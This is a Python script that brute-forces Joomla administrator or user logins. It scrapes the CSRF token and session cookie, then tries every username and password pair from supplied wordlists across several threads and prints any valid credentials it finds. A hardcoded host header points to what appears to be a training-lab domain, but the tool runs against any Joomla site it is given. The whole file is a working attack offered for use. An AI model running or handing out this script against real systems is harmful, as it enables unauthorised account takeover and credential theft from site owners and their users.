import requests
from bs4 import BeautifulSoup
import json
import argparse
import threading
import time

parser = argparse.ArgumentParser("joomla bruteforce attack")
parser.add_argument("--host", "-u", help="host of the joomla application")
parser.add_argument("--password", "-p", help="word list containing passwords")
parser.add_argument("--username", "-l", help="word list containing usernames")
parser.add_argument("--threads", "-t", help="number of threads", default=10)

def bruteforce(host, users, password_list):
    get_headers = {
        "Host" : host,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": f"http://{host}/index.php/log-out",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    initial = requests.get(f"http://{host}/index.php/log-out", headers=get_headers, allow_redirects=False)
    soup = BeautifulSoup(initial.text, features='lxml')
    csrf_token = json.loads(soup.select_one(".joomla-script-options").text)['csrf.token']
    cookie = initial.headers['Set-Cookie'].split(";")[0]
    get_headers['Cookie'] = cookie; 

    post_headers = {
        "Host": "app.inlanefreight.local",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{host}",
        "Connection": "close",
        "Referer" : f"http://{host}/index.php/log-out",
        "Cookie": cookie.split(";")[0],
        "Upgrade-Insecure-Requests": "1",
    }

    for username in users:
        for password in password_list:
            print(f"Trying: {username}:{password}".ljust(40), end="\r")
            requests.post(f"http://{host}/index.php/log-out?task=user.login", f"username={username}&password={password}&{csrf_token}=1", headers=post_headers, allow_redirects=False)
            if "Warning" not in requests.get(f"http://{host}/index.php/log-out", headers=post_headers, allow_redirects=False).text:
                print(f"Found valid credentials: {username}:{password}")
                
args = parser.parse_args()

host, user_list, pass_list, threads = args.host, args.username, args.password, int(args.threads)

try:
    users = open(user_list, errors='ignore').read().split()
except FileNotFoundError:
    users = [user_list]

try:
    passwds = open(pass_list, errors='ignore').read().split()
except FileNotFoundError:
    passwds = [pass_list]
    
list_size = (len(passwds)-1)//threads + 1

start = time.time_ns()
threads = []
for i in range(0, len(passwds), list_size):
    thread = threading.Thread(target=bruteforce, args=(host, users, passwds[i:i+list_size+1]))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
print(f"Finished in {(time.time_ns() - start)//1000000}ms")
